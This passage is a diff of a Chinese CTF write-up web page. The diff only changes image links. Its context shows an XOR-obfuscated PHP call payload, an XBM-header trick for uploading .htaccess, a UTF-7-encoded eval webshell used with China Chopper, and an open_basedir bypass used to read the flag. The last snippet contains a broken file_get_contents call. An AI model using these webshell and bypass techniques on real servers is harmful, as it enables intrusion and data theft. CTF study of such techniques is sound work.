@@ -211,7 +211,7 @@ E=&gt;0xba^0xff
 </ul>
 <pre><code class="visual">${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=phpinfo
 ${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag</code></pre>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661474033546.png" alt></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661474033546.png" alt></p>
 <ul>
 <li>正好拿WEB1的表单作为上传</li>
 </ul>
@@ -246,10 +246,10 @@ ${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag</code></pre>
 <p>  绕过<code>exif_imagetype</code>的检测，首先看一下这个函数的文档说明（图1），该函数读取图像的第一个字节，也就是说读取图片文件头，如果这个文件头是PHP自带的常量那么就可以通过检测。PHP常量如（图二）,只能使用xbm图片常量而其他常量都会导致<code>.htaccess</code>无法解析。因为XBM图片使用C代码作为表示，也就是在文件头定义两个常量分别是宽和高。这样既可绕过图片头检测。</p>
 <pre><code class="C">  #define test_width 16
   #define test_height 7</code></pre>
-<p>  <img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661483646268.png" alt></p>
-<p>  <img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661482481850.png" alt></p>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20190819/15661483646268.png" alt></p>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20190819/15661482481850.png" alt></p>
 <p>这样就成功上传了<code>.htaccess</code>文件，但是构造shell并不能直接上传因为过滤&lt;?，但是我们上面设置了解码<code>UTF-7</code>，那么我们就可以构造<code>UTF-7</code>编码的payload(<a href="http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7</a>).</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661488438097.png" alt></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661488438097.png" alt></p>
 <ul>
 <li><p>UTF-7一句话木马</p>
 <p>我们将木马同样上传上去，注意后缀为.aaa直接上菜刀连接。</p>
@@ -257,9 +257,9 @@ ${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag</code></pre>
 </ul>
 <pre><code>#define 4c11f3876d494218ff327e3ca6ac824f_width 1337
 #define 4c11f3876d494218ff327e3ca6ac824f_height 1337
-+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;a&#39;+AF0)+ADs?+AD4-</code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661494271641.png" alt></p>
++ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;a&#39;+AF0)+ADs?+AD4-</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661494271641.png" alt></p>
 <p>也可以使用phpinfo进行测试是否执行成功代码。</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661495566481.png" alt></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661495566481.png" alt></p>
 <h4 id="open-basedir绕过bypass"><a href="#open-basedir绕过bypass" class="headerlink" title="open_basedir绕过bypass"></a>open_basedir绕过bypass</h4><p>  <code>open_basedir</code>是php.ini中对目录进行授权的设置，使用菜刀连上后发现无法访问其他目录。所以考虑bypass<code>open_basedir</code>,这是一个外国大佬在今年四月份放出来的payload，具体原理我也不懂（—_—）.</p>
 <p>  新建一个php文件，写入如下代码即可列出任意目录文件列表。</p>
 <pre><code class="PHP">&lt;?php
@@ -275,7 +275,7 @@ ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
 var_dump(scandir(&#39;/&#39;));
 ?&gt;</code></pre>
 <p>可以看到flag文件名直接将<code>scandir</code>改成<code>file_get_contents()</code>读取flag</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661500221290.png" alt></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661500221290.png" alt></p>
 <pre><code class="php">&lt;?php
 ini_set(&#39;open_basedir&#39;,&#39;/tmp&#39;);
 mkdir(&#39;/tmp/fuck/&#39;);
@@ -288,7 +288,7 @@ chdir(&#39;..&#39;);
 ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
 var_dump(file_get_contents()(&#39;THis_Is_tHe_F14g&#39;));
 ?&gt;</code></pre>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661918208968.png" alt></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661918208968.png" alt></p>
 
 	</div>
 	<div class="meta split">
